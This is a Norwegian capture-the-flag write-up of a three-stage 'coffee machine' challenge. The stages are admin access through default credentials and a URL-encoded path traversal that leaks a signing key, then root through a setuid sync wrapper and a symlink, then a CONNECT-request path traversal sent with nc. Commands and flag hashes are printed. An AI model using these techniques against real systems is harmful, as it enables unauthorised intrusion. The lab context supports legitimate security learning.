# Kaffemaskin

En av kaffemaskinene til GooodGames er tilgjengelig over internett.

Se om du klarer å få tilgang til denne.

Kjør denne fra corax, og åpne URLen i nettleseren din:

```sh
echo "https://$USERID-coffee-machine.ctf.cybertalent.no"
```
---

## 2.19.1 Kaffemaskin
Jeg åpnet URL-en fra corax og fant kommentar med adminbruker på innloggingssiden.

- Default credentials på login-siden: `admin:coffee`.
- Fant flere konfigurasjonsfiler i `/file/`, f.eks. admin_pin.json, maintenance.json, users, hostname, hosts, etc.
  - admin_pin.json:  
        `{ "admin_pin": "8888aaaa" }`
- `admin_pin` måtte gjøres numerisk eller sjekken i input-feltet fjernes.
- `maintenance.json` hentet .sh-skript fra ekstern server og signerte dem med privat nøkkel.
- Fikk logget meg inn som admin, og fant [kaffemaskin-source](kaffemaskin-source.zip) i config/source.
- Fant etterhvert `private.pem` via URL-encoding `assets/..%252F..%252Fdata/hidden/private.pem`, signerte eget script og kjørte reverse shell ved å overskrive hosten.

```sh
cd home
ls -la
total 0
drwxr-xr-x    1 root     root            20 Dec 16 21:14 .
drwxr-xr-x    1 root     root            74 Dec 28 14:07 ..
drwxr-sr-x    1 coffee   coffee          27 Dec 16 21:14 coffee
cd coffee
ls -la
total 4
drwxr-sr-x    1 coffee   coffee          27 Dec 16 21:14 .
drwxr-xr-x    1 root     root            20 Dec 16 21:14 ..
-rw-------    1 coffee   coffee          33 Dec 28 14:07 user_flag.txt

cat user_flag.txt
966ee7167ad8977185e02be2f0ee569f
```

login@corax ~/2_oppdrag/2.19_Kaffemaskin $ scoreboard 966ee7167ad8977185e02be2f0ee569f

2.19.1 Kaffemaskin\
Godt med kaffe! Men jeg foretrekker egentlig kakao... Tar du root også?

---
## 2.19.2. Kaffemaskin Root
Denne var en del lettere, skjønte at fordi hosts/hostname på frontend ble synkronisert med /etc/, så ville det finnes en jobb som synkroniserte disse en gang i blant.

```sh
/var/lib/rce/data/admin $ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/sync-etc-wrapper
```

```sh
cd /var/lib/rce/data/admin/

# Lag symlink til motd
ln -sf /root/root_flag.txt motd

# Trigger sync-etc-wrapper (kunne også bare ventet tror jeg)
/usr/local/bin/sync-etc-wrapper

# Sjekk /etc/motd
cat /etc/motd
49136faa372a04bec8c280eaa0b98fad
```

login@corax ~/2_oppdrag/2.19_Kaffemaskin $ scoreboard 49136faa372a04bec8c280eaa0b98fad

2.19.2 Kaffemaskin ROOT\
Pasta og gaffateip har mange likheter, bra jobba! Ser ut som det er en server som kjører på kaffemaskinen...

---

## 2.19.3. Kaffemaskin Server
Fant [kildekoden til serveren](server-source/) med `wget -qO- http://127.0.0.1:8085/source 2>&1`.

```go
func serviceHandler(w http.ResponseWriter, r *http.Request) {
        if strings.Contains(r.RequestURI, "%") {
                http.Error(w, "bad path", http.StatusBadRequest)
                return
        }

        path := r.PathValue("path")
        if path == "" {
                http.NotFound(w, r)
                return
        }

        serveScript(w, path)
}
```

`CONNECT` ga 500-feil, og fordi mux ikke normaliserer paths på `CONNECT`-requests, kunne jeg gjøre path traversal med det. `GET` fungerte ikke. \
Antar flagget heter `server_flag.txt` siden de andre het `user_flag.txt` og `root_flag.txt`. Kunne også sjekket /entrypoint.sh på kaffemaskinen.

```sh
/var/lib/rce/data/admin $ printf "CONNECT /service/../../server_flag.txt HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 8085
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=../../server_flag.txt
Content-Type: application/octet-stream
X-Content-Type-Options: nosniff
X-Signature: tM2qNxhp+XGjniQURJr0TWNklDIP+3reFrrwamkwcSDpxb5D3OHIlTb7/03u3RpL5j2ygQmRTqPPuoP5jSWkDiHOxrXFPxdYKo4SR0Vt/mBs2OCLvwKB9QHV4GMAgRU35D1b5LiDPGRv5HiaTgrPGaOfzhCB5+u+JciKQ43jCzU=
X-Signature-Alg: rsa-sha256
Date: Mon, 29 Dec 2025 12:49:01 GMT
Content-Length: 33
Connection: close

dbb9842d5e50d9296e8a85907ec8d12f
```

login@corax ~/storage/2.19_uhh $ scoreboard dbb9842d5e50d9296e8a85907ec8d12f

2.19.3 Kaffemaskin SERVER\
Alle kaffemaskinene burde frykte deg nå...
